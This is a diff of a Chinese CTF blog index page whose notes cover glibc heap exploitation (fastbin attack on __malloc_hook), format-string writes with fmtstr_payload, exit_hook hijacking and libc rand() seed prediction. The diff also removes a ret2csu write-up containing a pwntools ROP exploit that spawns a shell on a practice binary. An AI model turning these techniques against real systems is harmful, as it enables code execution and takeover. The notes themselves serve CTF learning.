@@ -155,6 +155,167 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/21/%E4%BB%8Emalloc%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3plmalloc2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/21/%E4%BB%8Emalloc%E6%BA%90%E7%A0%81%E7%90%86%E8%A7%A3plmalloc2/" class="post-title-link" itemprop="url">从malloc源码理解堆分配机制</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-21 22:08:10" itemprop="dateCreated datePublished" datetime="2025-04-21T22:08:10+08:00">2025-04-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/16/heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/04/16/heap/" class="post-title-link" itemprop="url">heap</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-04-16 18:13:28" itemprop="dateCreated datePublished" datetime="2025-04-16T18:13:28+08:00">2025-04-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-21 21:51:23" itemprop="dateModified" datetime="2025-04-21T21:51:23+08:00">2025-04-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h1><p><img src="C:\hexo\source\images\heap\0.png" alt="0"></p>
+<h1 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h1><p><strong>glibc（GNU C Library）中动态内存分配器（ptmalloc2）</strong> 的一个关键全局变量，用于控制 <strong>fast bins（快速分配区）</strong> 的最大内存块大小。</p>
+<h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><p>32位下fast bin范围为16到64</p>
+<p>64位下fast bin范围为32到128</p>
+<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h1><p>unsorted bins的bk和fd指向的是一个指针,而这个指针指向的是top chunk的地址,这个地址又储存在main_arena的0x58偏移处</p>
+<p>main_arena - 0x10即为__malloc_hook的,__malloc_hook又是调用malloc时会调用的指针,所以可以通过劫持__malloc_hook来劫持程序控制流</p>
+<p>然后通过fastbin attack将下一个堆块改为__malloc_hook - 0x23处,因为只有改为这处,视为堆块的此处的size位置才为正确的数据</p>
+<h1 id="计算main-arena"><a href="#计算main-arena" class="headerlink" title="计算main_arena"></a>计算main_arena</h1><ol>
+<li><p>通过上面的泄露unsorted_bin的fd指针</p>
+</li>
+<li><p>通过__malloc_trim函数直接获得</p>
+<p> <strong>“比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。”</strong> -–ctfwiki</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/30/hexo%E4%B8%8A%E4%BC%A0%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -321,10 +482,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-03-27 17:45:31 / 修改时间：20:29:57" itemprop="dateCreated datePublished" datetime="2025-03-27T17:45:31+08:00">2025-03-27</time>
+              <time title="创建时间：2025-03-27 17:45:31" itemprop="dateCreated datePublished" datetime="2025-03-27T17:45:31+08:00">2025-03-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-31 22:17:19" itemprop="dateModified" datetime="2025-03-31T22:17:19+08:00">2025-03-31</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -359,6 +526,9 @@
 <h2 id="利用ctypes撞库"><a href="#利用ctypes撞库" class="headerlink" title="利用ctypes撞库"></a>利用ctypes撞库</h2><p>ctypes是Python内建的用于调用动态链接库函数的功能模块，通过调用该模块以及利用与题目相同的libc文件，来达到一个与题目中随机数生成方式相同的效果，实现撞库，这种方式下如果提前覆盖了指定种子，是更容易达成，如果直接设置时间种子撞库，可能存在时间对不上的情况，需要多测试几次。</p>
 <p>使用方法:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctype <span class="keyword">import</span> *</span><br><span class="line">libc=cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>) </span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    a.append(libc.rand())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用相同时间为种子</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -409,7 +579,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-29 16:59:39" itemprop="dateModified" datetime="2025-03-29T16:59:39+08:00">2025-03-29</time>
+                <time title="修改时间：2025-04-06 20:42:36" itemprop="dateModified" datetime="2025-04-06T20:42:36+08:00">2025-04-06</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -437,7 +607,7 @@
 
       
           <h1 id="何为exit-hook"><a href="#何为exit-hook" class="headerlink" title="何为exit_hook"></a>何为exit_hook</h1><p>hook即修改地址,exit_hook即修改exit函数内的地址达到控制执行流的目的</p>
-<h2 id="hook-rtld-lock-un-lock-recursive"><a href="#hook-rtld-lock-un-lock-recursive" class="headerlink" title="hook _rtld_lock(un)lock_recursive"></a>hook _<em>rtld_lock</em>(un)lock_recursive</h2><p>由fini_array这篇文章知道了<code>exit)()</code>在执行时会先调用<code>__run_exit_handlers</code>,而在这个函数中又会调用<code>_dl_fini</code></p>
+<h2 id="hook-rtld-lock-un-lock-recursive"><a href="#hook-rtld-lock-un-lock-recursive" class="headerlink" title="hook rtld_lock_(un)lock_recursive"></a>hook rtld_lock_(un)lock_recursive</h2><p>由fini_array这篇文章知道了<code>exit)()</code>在执行时会先调用<code>__run_exit_handlers</code>,而在这个函数中又会调用<code>_dl_fini</code></p>
 <p><code>_dl_fini</code>函数源码如下:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#ifdef SHARED</span><br><span class="line">  int do_audit = 0;</span><br><span class="line"> again:</span><br><span class="line">#endif</span><br><span class="line">  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      if (nloaded == 0</span><br><span class="line">#ifdef SHARED</span><br><span class="line">      || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">#endif</span><br><span class="line">      )</span><br><span class="line">    __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br></pre></td></tr></table></figure>
 
@@ -608,10 +778,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2025-03-21 19:11:18 / 修改时间：21:03:23" itemprop="dateCreated datePublished" datetime="2025-03-21T19:11:18+08:00">2025-03-21</time>
+              <time title="创建时间：2025-03-21 19:11:18" itemprop="dateCreated datePublished" datetime="2025-03-21T19:11:18+08:00">2025-03-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-04-22 14:43:00" itemprop="dateModified" datetime="2025-04-22T14:43:00+08:00">2025-04-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -725,6 +901,7 @@
 <li>length，输出的长度<ul>
 <li>hh，输出一个字节</li>
 <li>h，输出一个双字节</li>
+<li>ll, 输出一个八字节</li>
 </ul>
 </li>
 <li>type<ul>
@@ -744,15 +921,12 @@
 <h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>那么基础打牢,开始实践吧</p>
 <h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>上文已经介绍过用%p泄露出栈的地址,那么如何泄露栈变量的值和对应字符串呢</p>
 <p>要做到这些只需要将%p换成%x和%s即可</p>
-<p>可能又有师傅要问了:<strong>auv,你这个就只能泄露当前地址吗,这个格式化字符串就是逊啦</strong></p>
-<p>那么一看这位师傅就没好好看基础部分啊,<del>来人,抓起来拷打</del></p>
 <p>我们可以用%k$s这种形式的格式化字符串来获取偏移量为<strong>k</strong>的地址的数据,所以只要知道指定内存地址相对于参数位置的偏移就可以打印任意地址的数据了</p>
 <h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>这里需要用到一个非常特别的字符串%n</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure>
 
 <p>这使得我们可以通过精妙的构造来向指定地址写入任意的值</p>
-<p>那么有的师傅(<del>没错,又是我们那位师傅</del>)又要说了:<strong>uva,你这精妙的构造一般人想的出来吗,真当人人都能用观察法解出高考压轴题吗</strong></p>
-<p>没错,这位师傅又错了,咱们可以使用pwntools中fmtstr中的神器<strong>fmtstr_payload</strong></p>
+<p>可以使用pwntools中fmtstr中的神器<strong>fmtstr_payload</strong></p>
 <p>使用方法入下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset,&#123;原始地址:目标地址&#125;)</span><br></pre></td></tr></table></figure>
 
@@ -996,205 +1170,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/17/ret2csu/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.png">
-      <meta itemprop="name" content="Sn0r1ax">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome!">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/17/ret2csu/" class="post-title-link" itemprop="url">ret2csu</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-17 21:41:47" itemprop="dateCreated datePublished" datetime="2025-03-17T21:41:47+08:00">2025-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-19 21:32:23" itemprop="dateModified" datetime="2025-03-19T21:32:23+08:00">2025-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="何为ret2csu"><a href="#何为ret2csu" class="headerlink" title="何为ret2csu?"></a>何为ret2csu?</h1><p>ret2csu即通过栈溢出等方法构造ROP链劫持利用<code>__libc_csu_init</code>函数</p>
-<h1 id="这个函数长什么样"><a href="#这个函数长什么样" class="headerlink" title="这个函数长什么样"></a>这个函数长什么样</h1><p><img src="/../images/ret2csu/0.png" alt="0"></p>
-<p>这是该函数全貌,不过我们主要利用<code>0x40050</code>到<code>0x4005a4</code>这两段,下文简称下面那部分为<code>csu0</code>,上面那部分为<code>csu1</code></p>
-<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p><code>csu0</code>段代码主要进行的是将栈上的数据弹入到指定寄存器中(进行劫持利用时一般是直接从csu0段的第二行开始利用,即跳过&#96;&#96;add rsp,8&#96;)</p>
-<p>而<code>csu1</code>段则对弹入寄存器中的数据进行进一步处理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rbx --&gt; 与r12一起控制跳转地址</span><br><span class="line">rbp --&gt; 与rbx一起作为是否循环条件</span><br><span class="line">r12 --&gt; 与rbx一起控制跳转地址</span><br><span class="line">r13 --&gt; rdx</span><br><span class="line">r14 --&gt; rsi</span><br><span class="line">r15 --&gt; edi(零扩展地赋值给rdi)</span><br></pre></td></tr></table></figure>
-
-<p>这里rbx一般赋值为0,rbp赋值1,避免进入循环.(<strong>如果需要借助csu来控制rbx的值,得注意r12与rbp的值</strong>)</p>
-<h1 id="适用情形"><a href="#适用情形" class="headerlink" title="适用情形"></a>适用情形</h1><h2 id="控制edi-rsi-rdx的参数"><a href="#控制edi-rsi-rdx的参数" class="headerlink" title="控制edi,rsi,rdx的参数"></a>控制edi,rsi,rdx的参数</h2><p>这三个寄存器在64位程序中储存的是函数调用时前三个参数</p>
-<h2 id="向bss段写入数据"><a href="#向bss段写入数据" class="headerlink" title="向bss段写入数据"></a>向bss段写入数据</h2><p>前提得先泄露出libc的版本及基址</p>
-<p>通过csu(0,1,read_addr,0,bss_addr,0,ret_addr)来向bss段写入数据</p>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>例题:<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_s_3">ciscn_s_3</a></p>
-<h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/../images/ret2csu/1.png" alt="1"></p>
-<p>先checkesc查看保护,除了nx啥都没开,不过这个预示着这题可能需要ROP链的构造</p>
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><img src="/../images/ret2csu/2.png" alt="2"></p>
-<p>调试偶遇限制读入0x400字节的read函数,试试看能否溢出</p>
-<p>这里使用cyclic工具先生成一个100个字母的字符串<code>cyclic 100</code></p>
-<p><img src="/../images/ret2csu/3.png" alt="3"></p>
-<p>这里返回地址成功被修改了,看看偏移是多少</p>
-<p><code>cyclic -l 0x6161616661616165</code></p>
-<p><img src="/../images/ret2csu/4.png" alt="4"></p>
-<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="/../images/ret2csu/5.png" alt="5"></p>
-<p><img src="/../images/ret2csu/6.png" alt="6"></p>
-<p>主程序就是系统调用了一个<code>read</code>函数和<code>write</code>函数</p>
-<p>这个<code>read</code>函数如上所述,可以通过栈溢出控制,而这个<code>write</code>函数输出的字节为0x30,我们的的buf变量只有0x10的空间,所以可以通过<code>write</code>函数来泄露栈地址</p>
-<p>然后在函数栏发现了一个名为gadgets的可疑函数,跟进去看看</p>
-<p><img src="/../images/ret2csu/7.png" alt="7"></p>
-<p>是给rax赋值的语句,而rax则与&#96;&#96;syscall&#96;有关</p>
-<p><code>syscall</code>从<strong>rax寄存器</strong>读取值来进行系统调用,而3Bh对应的系统调用就是<code>execve</code></p>
-<h2 id="逻辑推理"><a href="#逻辑推理" class="headerlink" title="逻辑推理"></a>逻辑推理</h2><p>那么到这里我们的思路就很清晰了,我们的目的就是通过执行execve(&#x2F;bin&#x2F;sh,0,0)来getshell</p>
-<p>即构造最终各寄存器储存的值是这样↓</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rax = 0x3b</span><br><span class="line">rdi = &#x27;/bin/sh&#x27;</span><br><span class="line">rsi = 0</span><br><span class="line">rdx = 0</span><br></pre></td></tr></table></figure>
-
-<p>这里rax由gadgets这里的代码段来控制</p>
-<p>而‘&#x2F;bin&#x2F;sh’可以直接往栈上写,然后通过泄露地址来将‘&#x2F;bin&#x2F;sh’弹入寄存器</p>
-<p>至于rsi和rdi的值直接通过csu函数进行修改</p>
-<p>那么到这里还有一个问题:<strong>如何泄露‘&#x2F;bin&#x2F;sh’地址</strong></p>
-<h2 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h2><p><img src="/../images/ret2csu/8.png" alt="8"></p>
-<p>这里我们选取原rbp+10处的值作为基址来计算输入数据的偏移</p>
-<p><strong>理由:</strong> write输出的为0x30个字节,而rbp+8的位置是返回地址,在泄露地址的时候可能会通过栈溢出修改rbp的值,再往下就只有rbp+10处是储存的栈上的地址</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,&#x27;29976&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b main&#x27;)</span></span><br><span class="line"></span><br><span class="line">mov_rax = <span class="number">0x4004E2</span></span><br><span class="line">csu0 = <span class="number">0x40059A</span></span><br><span class="line">csu1 = <span class="number">0x400580</span></span><br><span class="line">vuln = <span class="number">0x0004004ed</span></span><br><span class="line">pop_rdi = <span class="number">0x4005a3</span></span><br><span class="line">syscall = <span class="number">0x400501</span></span><br><span class="line">stack_offset = <span class="number">0x158</span></span><br><span class="line"><span class="comment">#stack_offset = 0x118 *远程的偏移为0x118*</span></span><br><span class="line">payload0 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(vuln)</span><br><span class="line"><span class="comment">#print(payload0)</span></span><br><span class="line">p.sendline(payload0)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recv(<span class="number">8</span>)) - stack_offset</span><br><span class="line"><span class="comment">#print(hex(stack))</span></span><br><span class="line">payload = p64(pop_rdi) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(csu0)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(stack) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1) + p64(mov_rax)</span><br><span class="line">payload += p64(pop_rdi) + p64(stack+<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>该题通过ret2csu来控制rsi与rdx的值使得execve函数能够成功getshell</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/11/%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.png">
-      <meta itemprop="name" content="Sn0r1ax">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome!">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/11/%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2/" class="post-title-link" itemprop="url">绕过字符数限制之强制转换的利用</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-11 20:01:33" itemprop="dateCreated datePublished" datetime="2025-03-11T20:01:33+08:00">2025-03-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-19 16:04:23" itemprop="dateModified" datetime="2025-03-19T16:04:23+08:00">2025-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h1><p><img src="/../images/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/0.png" alt="0"></p>
-<p>这里由int转换为unsigned int时-1会转换为最大的无符号数,可以利用这个来规避掉一些字符数限制</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1266,7 +1241,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
